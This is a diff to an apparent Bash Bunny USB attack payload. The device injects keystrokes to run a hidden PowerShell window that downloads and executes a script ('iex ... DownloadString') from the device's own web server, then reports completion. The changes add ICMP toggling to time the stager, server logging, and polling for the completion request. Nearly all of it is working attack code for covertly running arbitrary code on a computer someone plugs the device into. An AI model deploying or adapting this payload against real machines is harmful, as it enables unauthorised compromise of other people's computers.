@@ -12,7 +12,8 @@
 # Amber Blink Fast.....Initialization
 # Red..................No psh.txt present in payload directory (powershell payload)
 # Blue Blink Fast......HID Stage
-# White Blink Fast.....Ethernet Stage
+# White Blink..........Ethernet Stage
+# White Blink Fast.....Web server started
 # Green................Finished
 #
 LED R G 100
@@ -21,6 +22,12 @@ source bunny_helpers.sh
 # Set working dir
 PAYLOAD_DIR=/root/udisk/payloads/$SWITCH_POSITION
 cd $PAYLOAD_DIR
+SERVER_LOG=server.log
+
+# Fresh Server Log
+rm -f $SERVER_LOG
+# Disable ICMP/echo replies so our powershell stager doesn't attempt to access the SMB share before smbserver starts (workaround since Test-NetConnection 172.16.64.1 SMB only works on powershell 4.0+ for Windows 8+)
+echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all
 
 # Check for psh.txt
 if [ ! -f $PAYLOAD_DIR/psh.txt ]; then
@@ -35,7 +42,7 @@ LED B 100
 Q GUI r
 Q DELAY 500
 # Wait for IP then download powershell script and run it
-Q STRING "powershell -WindowStyle Hidden \"while (\$true) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 1; iex (New-Object Net.WebClient).DownloadString('http://172.16.64.1/psh.txt'); exit } }\""
+Q STRING "powershell -WindowStyle Hidden \"while (\$TRUE) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { iex (New-Object Net.WebClient).DownloadString('http://172.16.64.1/psh.txt'); Invoke-WebRequest 'http://172.16.64.1/COMPLETE'; exit } }\""
 Q ENTER
 
 # Ninja vanish
@@ -49,14 +56,19 @@ Q ENTER
 # Attack Ethernet
 LED R G B 500
 ATTACKMODE RNDIS_ETHERNET
-sleep 2
 
 # Start web server
 iptables -A OUTPUT -p udp --dport 53 -j DROP # disallow outgoing dns requests so server starts immediately
-python -m SimpleHTTPServer 80 &
+python -m SimpleHTTPServer 80 > $SERVER_LOG 2>&1 &
 
 # wait until python web server is listening
 while ! nc -z localhost 80; do sleep 0.2; done
+# Re-enable ICMP/echo replies to trip the powershell stager
+echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all
+LED R G B 100
 
-sleep 2 # Wait to ensure powershell download, should be instant
+while ! grep -Fq "GET /COMPLETE" $SERVER_LOG; do
+    sleep .5
+done
+
 LED G
